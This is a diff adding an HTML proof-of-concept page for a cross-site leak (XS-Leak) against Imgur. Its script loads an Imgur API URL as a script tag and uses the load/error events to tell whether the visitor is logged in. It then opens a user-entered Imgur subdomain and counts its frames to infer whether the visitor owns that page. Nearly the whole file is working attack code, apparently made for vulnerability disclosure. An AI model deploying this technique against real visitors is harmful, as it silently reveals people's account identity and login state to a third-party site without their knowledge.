@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Imgur POC</title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    </head>
+    <body>
+        <div class="container pt-3">
+            <h1>
+                XSLEAK - POC
+            </h1>
+            <div class="form-group">
+                <br />
+                <div class="row">
+                    <div class="col-md-10">
+                        <input type="text" placeholder="Enter page domain e.g.  xyz.imgur.com" class="form-control" id="do">
+                    </div>
+                    <div class="col-md-2">
+                        <button type="button" class="btn btn-success" onclick="checkOwner();">Check</button>
+                    </div>
+                </div>
+            </div>
+            <div class="container">
+                <code id="result">
+
+
+                </code>
+            </div>
+        </div>
+        <script>
+            window.Loggedin = null;
+            var loginDetection = () => {
+                var url = "https://api.imgur.com/3/larynx/history?IMGURPLATFORM=web&IMGURUIDJAFO=9d77969d8b3a7a6ac6cb78943c96e48cd0bd74e02b29839f9f19aea827429db6&SESSIONCOUNT=3&client_id=546c25a59c58ad7"
+                var element = document.createElement('script');
+                element.onerror = () => {
+                    console.log("Not logged in");
+                    window.Loggedin = false;
+                }
+                element.onload = () => {
+                    console.log("Logged in..");
+                    window.Loggedin = true;
+                }
+                element.setAttribute('src',url);
+                document.body.appendChild(element);
+            }
+
+            var checkOwner = () => {
+                var domain = document.getElementById('do').value;
+                var result = document.getElementById('result');
+                result.innerHTML = "[+] Please wait for 15 secs, we are checking..";
+                if(win == null)
+                    var win = window.open();
+                win.location = "https://"+domain+"/all"
+                loginDetection();
+                setTimeout(() => {
+                    console.log(win.frames.length);
+                    if(window.Loggedin){
+                        if(win.frames.length == 5){
+                            result.innerHTML = "[+] you are logged in<br />"
+                            result.innerHTML += "[+] Gottcha! you own this page..";
+                        }else{
+                            result.innerHTML = "[+] you are logged in<br />"
+                            result.innerHTML += "[+] you don't own this page";
+                        }
+                    }else{
+                        result.innerHTML = "[+] You are not logged in..";
+                    }
+                }, 15000);
+            }
+
+        </script>
+
+    </body>
+</html>
